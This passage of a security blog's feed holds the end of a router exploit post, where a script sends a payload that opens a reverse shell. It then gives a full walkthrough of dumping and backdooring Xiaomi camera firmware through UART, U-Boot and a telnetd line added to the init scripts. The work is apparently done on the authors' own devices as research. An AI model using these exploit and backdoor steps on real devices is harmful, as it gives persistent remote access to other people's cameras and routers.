+&lt;span class=&quot;n&quot;&gt;conn&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;remote&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'192.168.227.128'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;80&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;conn&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sa&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'GET /'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\r\n\r\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/dvar_26.png&quot; alt=&quot;dvar_26.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/dvar_27.png&quot; alt=&quot;dvar_27.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;The exploit code ran successfully and made a reverse shell connection to port 4444, which we had listening on our host machine. Thank you to those who have read this far. See you in future posts :)&lt;/p&gt;</content><author><name>GitHub User</name></author><category term="iot" /><category term="hardware" /><category term="router" /><category term="exploitation" /><category term="vulnerability" /><summary type="html">(This article was previously written in Turkish by one of our teammates. Oct 24, 2020)</summary></entry><entry><title type="html">Xiaomi Smart Camera - Recovering Firmware and Backdooring</title><link href="http://localhost:4000/2021/07/14/Xiaomi-Smart-Camera-Recovering-Firmware-and-Backdooring.html" rel="alternate" type="text/html" title="Xiaomi Smart Camera - Recovering Firmware and Backdooring" /><published>2021-07-14T00:00:00-07:00</published><updated>2021-07-14T00:00:00-07:00</updated><id>http://localhost:4000/2021/07/14/Xiaomi-Smart-Camera---Recovering-Firmware-and-Backdooring</id><content type="html" xml:base="http://localhost:4000/2021/07/14/Xiaomi-Smart-Camera-Recovering-Firmware-and-Backdooring.html">&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Xiaomi Mi Home Security Camera 360°&lt;/code&gt; is an IP camera which has night vision, 360° PTZ control and motion detection features.&lt;/p&gt;
+
+&lt;p&gt;Users can instantly remote control the camera they located in their home. In addition to live video streaming, it can also do voice communication through the microphone and speaker it has.&lt;/p&gt;
+
+&lt;p&gt;Users can connect with the device via the Xiaomi cloud service connected mobile application (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;MI Home&lt;/code&gt;).&lt;/p&gt;
+
+&lt;p&gt;In this article, we will be talking about the steps we take until we get root shell access on the device.&lt;/p&gt;
+
+&lt;table&gt;
+  &lt;thead&gt;
+    &lt;tr&gt;
+      &lt;th&gt;&lt;span style=&quot;color:red&quot;&gt;Model&lt;/span&gt;&lt;/th&gt;
+      &lt;th&gt;&lt;span style=&quot;color:red&quot;&gt;Picture&lt;/span&gt;&lt;/th&gt;
+    &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td&gt;&lt;span style=&quot;color:skyblue&quot;&gt;MJSXJ09CM&lt;/span&gt;&lt;/td&gt;
+      &lt;td&gt;&lt;img src=&quot;/images/MJSXJ09CM.png&quot; alt=&quot;MJSXJ09CM&quot; /&gt;&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;p&gt;After installation via the mobile application, an IP address is assigned to the device. As you can see from the NMAP output, the device does not have any open port.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/nmap.png&quot; alt=&quot;NMAP&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;At this point, we could test the mobile application, which is the only place where we can interact with the device remotely. But for now we’ve decided to disassemble the device and take a closer look at the hardware. It will be useful for us if we can identifying a serial port on the board.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/cam_1.png&quot; alt=&quot;cam_1&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;The device has a 32-bit ARM processor and 16 MB flash memory.&lt;/p&gt;
+
+&lt;p&gt;&lt;span style=&quot;color:red&quot;&gt;SoC: &lt;/span&gt; &lt;span style=&quot;color:orange&quot;&gt;SigmaStar SSC323 ARM Cortex-A7&lt;/span&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;span style=&quot;color:red&quot;&gt;Flash chip: &lt;/span&gt; &lt;span style=&quot;color:orange&quot;&gt;KHIC MX25L12833F&lt;/span&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/board_1.png&quot; alt=&quot;board_1&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/board_2.png&quot; alt=&quot;board_2&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/cpu.png&quot; alt=&quot;cpu&quot; /&gt; 
+&lt;span style=&quot;color:deepskyblue&quot;&gt;SoC&lt;/span&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/flash.png&quot; alt=&quot;flash&quot; /&gt;
+&lt;span style=&quot;color:deepskyblue&quot;&gt;Flash chip&lt;/span&gt;&lt;/p&gt;
+
+&lt;p&gt;The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;MJSXJ09CM&lt;/code&gt;’s board is almost exactly the same as the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;MJSXJ05CM&lt;/code&gt;’s board. But the board of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;MJSXJ02CM&lt;/code&gt; (older one) was slightly different. Inspired by the UART pins identified by the researchers on the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;MJSXJ02CM&lt;/code&gt;, we tested the pins in the same area on our own device.
+&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;MJSXJ02CM&lt;/code&gt; uart &lt;a href=&quot;https://github.com/telmomarques/xiaomi-360-1080p-hacks/issues/9#issuecomment-471491901&quot;&gt;pins.&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;Although there is no label around the pins, we easily identified the UART pins with the help of a multimeter.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/uart_1.png&quot; alt=&quot;uart_1&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;The soldered image of the TX, RX and GND pins is as in the photo.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/uart_2.png&quot; alt=&quot;uart_2&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;The tool we use for the UART connection is FT232RL.                                      &lt;br /&gt;
+&lt;img src=&quot;/images/ft232rl.png&quot; alt=&quot;ft232rl&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;After connecting the FT232RL to the computer via USB, we started the serial communication program by command below.&lt;/p&gt;
+
+&lt;p&gt;&lt;span style=&quot;color:red&quot;&gt;UART baudrate:&lt;/span&gt; 115200&lt;/p&gt;
+
+&lt;p&gt;&lt;span style=&quot;color:red&quot;&gt;Terminal emulator:&lt;/span&gt; Picocom&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/picocom.png&quot; alt=&quot;picocom&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;We will see the outputs of the entire Boot process as soon as we power the camera.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/booting.png&quot; alt=&quot;booting&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;After the boot process is complete, we cannot get an active shell access we can provide any inputs.&lt;/p&gt;
+
+&lt;p&gt;In some cases, you might then see a prompt saying that you can press a key to activate console. Or some cases where activation can be achieved by any special key combination. Unfortunately, we were not so lucky in our case and we couldn’t get access to the easy way.&lt;/p&gt;
+
+&lt;p&gt;We decided to go through the bootloader. Most of the time, it is possible to get firmware with bootloader features. This device uses U-Boot which is very popular for embedded devices. As soon as the device is powered on, if you hold down the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Enter&lt;/code&gt; key, autoboot will be stop and the U-Boot console will be active.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/stop_autoboot.png&quot; alt=&quot;stop_autoboot&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;All supported commands can be listed with the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Help&lt;/code&gt; command.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;SigmaStar &lt;span class=&quot;c&quot;&gt;# help&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/help.png&quot; alt=&quot;help&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Here you can see the boot parameters passed to the kernel.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;SigmaStar &lt;span class=&quot;c&quot;&gt;# printenv&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/bootargs.png&quot; alt=&quot;bootargs&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;If we set the init parameter here to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/bin/sh&lt;/code&gt;, we are telling the Linux kernel to run /bin/sh as init instead of system init. This gives us the root shell during the boot time.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;SigmaStar &lt;span class=&quot;c&quot;&gt;# setenv bootargs console=ttyS0,115200 root=/dev/mtdblock2 rootfstype=squashfs ro init=/bin/sh LX_MEM=0x3fe0000 mma_heap=mma_heap_name0,miu=0,sz=0x1400000 mma_memblock_remove=1&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;SigmaStar &lt;span class=&quot;c&quot;&gt;# sf probe 0;sf read 0x22000000 ${sf_kernel_start} ${sf_kernel_size};bootm 0x22000000&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/temp_sh.png&quot; alt=&quot;temp_sh&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/temp_sh2.png&quot; alt=&quot;temp_sh2&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/temp_sh3.png&quot; alt=&quot;temp_sh3&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;But this shell did not allow us to make changes to the system as the file system is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;read-only&lt;/code&gt; squashfs. If we had a writable filesystem, maybe we could add a script to run a telnet or ssh service on the system.&lt;/p&gt;
+
+&lt;h1 id=&quot;obtaining-firmware-through-u-boot&quot;&gt;Obtaining Firmware Through U-Boot&lt;/h1&gt;
+
+&lt;p&gt;There are several methods of obtaining firmware via the bootloader. One of them is to use tftp, which is useless in our scenario since we don’t have an ethernet interface.&lt;/p&gt;
+
+&lt;p&gt;Another technique is to use the very primitive &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;memory display&lt;/code&gt; method. We can print the memory contents on the U-boot console using the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;md&lt;/code&gt; command. If we know the starting address of the firmware in the memory and the size, we can print all this space on the screen. The simplest way to find out this information is to look at the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;bootcmd&lt;/code&gt; parameter in the output of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;printenv&lt;/code&gt; command.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/bootcmd.png&quot; alt=&quot;bootcmd&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sf read&lt;/code&gt; command is used to copy flash content to RAM. 0x22000000 specifies from which address in RAM the content will be copied. This was the first value we needed. 
+The other value we need is the flash size. We could already see this value when the bootloader first started.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/flash_detected.png&quot; alt=&quot;flash_detected&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;We have a 16 MB flash, which means 0x1000000 in hex.&lt;/p&gt;
+
+&lt;p&gt;Another way to find out the total mapped data size is to look at the partition information in the boot output.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/partitions.png&quot; alt=&quot;partitions&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Final command for printing the all flash content:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;SigmaStar &lt;span class=&quot;c&quot;&gt;# md.b 0x22000000 0x1000000&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Printing to the screen will take a long time, and before doing this, do not forget to save the console output to a file.&lt;/p&gt;
+
+&lt;p&gt;For this, the save feature of the terminal emulator you use can be preferred. Here is the another option:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;picocom &lt;span class=&quot;nt&quot;&gt;-b&lt;/span&gt; 115200 /dev/ttyUSB0 | &lt;span class=&quot;nb&quot;&gt;tee &lt;/span&gt;flash.out
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;We have a file with the output of the entire console (in our case &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;flash.out&lt;/code&gt;). Currently this file is still not a binary file, it just contains some plain-text and hex characters. We have to manually clean the unnecessary content in this file. Only memory output should remain.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/hexdump.png&quot; alt=&quot;hexdump&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Then we need to convert this hexdump to a binary file. You can find the python code that does this conversion from &lt;a href=&quot;https://github.com/SungurLabs/Firmware-scripts/blob/main/hex2bin.py&quot;&gt;here&lt;/a&gt;. The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;hex2bin.py&lt;/code&gt; code does this automatically. All you have to do is give the hexdump file as input and specify the name of the output file.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/hex2bin.png&quot; alt=&quot;hex2bin&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Finally, we have a firmware of the device. Now we can extract it with the help of binwalk and examine it.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/binwalk.png&quot; alt=&quot;binwalk&quot; /&gt;
+&lt;img src=&quot;/images/binwalk2.png&quot; alt=&quot;binwalk2&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;In this article, our main goal is to get shell access on the device as a priority, so we postpone firmware analysis for now.&lt;/p&gt;
+
+&lt;h1 id=&quot;firmware-backdooring&quot;&gt;Firmware Backdooring&lt;/h1&gt;
+
+&lt;p&gt;We somehow got the firmware of the device, but we still couldn’t get a shell that we could access remotely to the live system. So we decided to modify the original firmware and put a backdoor in it.&lt;/p&gt;
+
+&lt;p&gt;First we have to extract the partitions of the firmware and then access the file system that we are going to modify.
+The offsets of each partition should be added to the script. You can find these values from the binwalk output.
+You can access &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;packer&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;unpacker&lt;/code&gt; scripts on our github &lt;a href=&quot;https://github.com/SungurLabs/Firmware-scripts&quot;&gt;repo&lt;/a&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/unpacker.png&quot; alt=&quot;unpacker&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Squashfs are a compressed read-only file system and are commonly found on embedded systems. In this way, users are prevented from making changes to the file system. But after we uncompress this file system with the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;unsquashfs&lt;/code&gt; tool, we will be able to make new additions to it. Then we will create a new squashfs filesystem with these updated files.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;unsquashfs &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; squashfs_out squashfs
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/unaqashfs.png&quot; alt=&quot;unaqashfs&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/squasfs_files.png&quot; alt=&quot;squasfs_files&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;One of the best places to add backdoor is init scripts(&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/init.d/&lt;/code&gt;). Because these scripts are run while the device is booting and does not require a condition. The actual init script here is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rcS&lt;/code&gt;, and it runs files in this directory that starting names begin with a capital &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;S&lt;/code&gt;, in numerical order. These are the start scripts. Likewise, the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rcK&lt;/code&gt; script is run at shutdown.&lt;/p&gt;
+
+&lt;p&gt;Telnet can be used to create a backdoor, but the device does not have a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;telnetd&lt;/code&gt; binary. There is a limited version of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Busybox&lt;/code&gt;. At this point we decided to put a statically compiled &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;busybox&lt;/code&gt; on the device that supports &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;telnetd&lt;/code&gt;. 
+The Busybox binary can be download &lt;a href=&quot;https://www.busybox.net/downloads/binaries/1.21.1/busybox-armv7l&quot;&gt;here&lt;/a&gt;. We can put this binary on sdcard and run it from there.&lt;/p&gt;
+
+&lt;p&gt;The one-line command we added to the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rcS&lt;/code&gt; script is as shown in the picture.                                    &lt;br /&gt;
+&lt;img src=&quot;/images/busybox.png&quot; alt=&quot;busybox&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Adding &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;backdoor&lt;/code&gt; is complete. Now it’s time to create a new squashfs filesystem with updated init script. The tool we will use to do this is called &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mksquashfs&lt;/code&gt;. But first we need to know the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;compression type&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;block size&lt;/code&gt; of the squashfs we will create. We can get this informations from the details of the original squashfs by running &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;unsquashfs&lt;/code&gt; with the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-s&lt;/code&gt; parameter.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/squashfs_s.png&quot; alt=&quot;squashfs_s&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Compression is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;xz&lt;/code&gt; and blok size is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;131072&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;We are ready to create the file system.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;mksquashfs squashfs_out/ squashfs_new &lt;span class=&quot;nt&quot;&gt;-comp&lt;/span&gt; xz &lt;span class=&quot;nt&quot;&gt;-b&lt;/span&gt; 131072
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;mv &lt;/span&gt;squashfs_new squashfs
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/mksquashfs.png&quot; alt=&quot;mksquashfs&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Don’t forget to replace the old squashfs with the new one.&lt;/p&gt;
+
+&lt;p&gt;The last thing we need to do to create the final firmware is to repack the unpacked partitions.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/firmware_new.png&quot; alt=&quot;firmware_new&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Now our backdoored firmware is ready.&lt;/p&gt;
+
+&lt;p&gt;We have 2 methods to upload the new firmware we have modified to the device. One of them is firmware update process via &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sdcard&lt;/code&gt;. The camera checking the existence of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/mnt/sdcard/tf_update.img&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/mnt/sdcard/tf_all.img&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/mnt/sdcard/tf_all_recovery.img&lt;/code&gt; files in sdcard every time it boot up. We can start the update procedure of the device by placing the firmware on the sdcard (firmware has to be named &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tf_update.img&lt;/code&gt;).&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/not_exist.png&quot; alt=&quot;not_exist&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;However, we were not successful in this process because the device does the signature verification of the file.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/hashing.png&quot; alt=&quot;hashing&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;The other method we will apply in this article is firmware uploading via direct access to flash. For this, we will use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CH341A flash programmer&lt;/code&gt; with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SOIC8 clip&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/ch341a.png&quot; alt=&quot;ch341a&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/ch341a_2.png&quot; alt=&quot;ch341a_2&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;We’ll use the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;flashrom&lt;/code&gt; tool to write the firmware to flash. The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-p&lt;/code&gt; parameter is used for the programmer name, and the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-c&lt;/code&gt; parameter is for the flash chip name.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/flashing.png&quot; alt=&quot;flashing&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;After about 10 minutes of operation, we have now written our backdoored firmware to flash. Now it’s time to power up the device and test if the telnet port is active.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/shell.png&quot; alt=&quot;shell&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;YAY! 
+Mission completed.&lt;/p&gt;</content><author><name>GitHub User</name></author><category term="iot" /><category term="hardware" /><category term="camera" /><summary type="html">Xiaomi Mi Home Security Camera 360° is an IP camera which has night vision, 360° PTZ control and motion detection features.</summary></entry></feed>
